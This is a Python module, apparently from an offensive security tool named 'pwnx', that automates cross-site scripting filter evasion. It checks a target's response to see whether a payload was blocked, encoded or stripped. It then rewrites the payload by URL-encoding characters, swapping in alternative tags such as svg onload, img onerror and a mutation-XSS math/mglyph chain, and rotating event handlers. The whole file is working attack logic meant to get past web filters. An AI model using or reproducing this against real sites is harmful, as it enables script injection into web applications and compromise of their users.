"""Automatic payload mutation on failure."""

import logging
from typing import Dict

logger = logging.getLogger("pwnx.utils")

def analyze_failure(response_html: str, payload: str, context: str) -> Dict:
    """Determine why payload failed and suggest mutation."""
    import html as html_module

    decoded = html_module.unescape(response_html)
    feedback = {
        "blocked": False,
        "encoded": False,
        "stripped_tags": [],
        "stripped_events": [],
        "suggestion": "retry",
    }

    # Check if payload was blocked entirely
    if payload not in decoded and payload not in response_html:
        feedback["blocked"] = True
        if any(x in response_html.lower() for x in ["blocked", "forbidden", "403"]):
            feedback["suggestion"] = "encode_obfuscate"
        return feedback

    # Check if HTML-encoded
    if payload not in decoded and payload in response_html:
        feedback["encoded"] = True
        feedback["suggestion"] = "encode_obfuscate"
        return feedback

    # Check what was stripped
    import re
    tag_pattern = re.compile(r"<(\w+)")
    original_tags = tag_pattern.findall(payload)
    reflected_tags = tag_pattern.findall(decoded)
    feedback["stripped_tags"] = [t for t in original_tags if t not in reflected_tags]

    event_pattern = re.compile(r"on\w+=" )
    original_events = event_pattern.findall(payload)
    reflected_events = event_pattern.findall(decoded)
    feedback["stripped_events"] = [e for e in original_events if e not in reflected_events]

    if feedback["stripped_tags"]:
        feedback["suggestion"] = "alternative_tags"
    elif feedback["stripped_events"]:
        feedback["suggestion"] = "alternative_events"

    return feedback

def mutate_payload(payload: str, feedback: Dict, context: str) -> str:
    """Apply mutation based on failure feedback."""
    if feedback["suggestion"] == "encode_obfuscate":
        # URL encode critical characters
        return payload.replace("<", "%3C").replace(">", "%3E").replace('"', "%22")

    elif feedback["suggestion"] == "alternative_tags":
        alternatives = {
            "img": "<svg onload=alert(1)>",
            "script": "<img src=x onerror=alert(1)>",
            "svg": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        }
        for tag, alt in alternatives.items():
            if f"<{tag}" in payload.lower():
                return alt

    elif feedback["suggestion"] == "alternative_events":
        events = ["onerror=", "onload=", "onmouseover=", "onfocus=", "ontoggle="]
        for i, evt in enumerate(events):
            if evt in payload:
                return payload.replace(evt, events[(i + 1) % len(events)])

    return payload
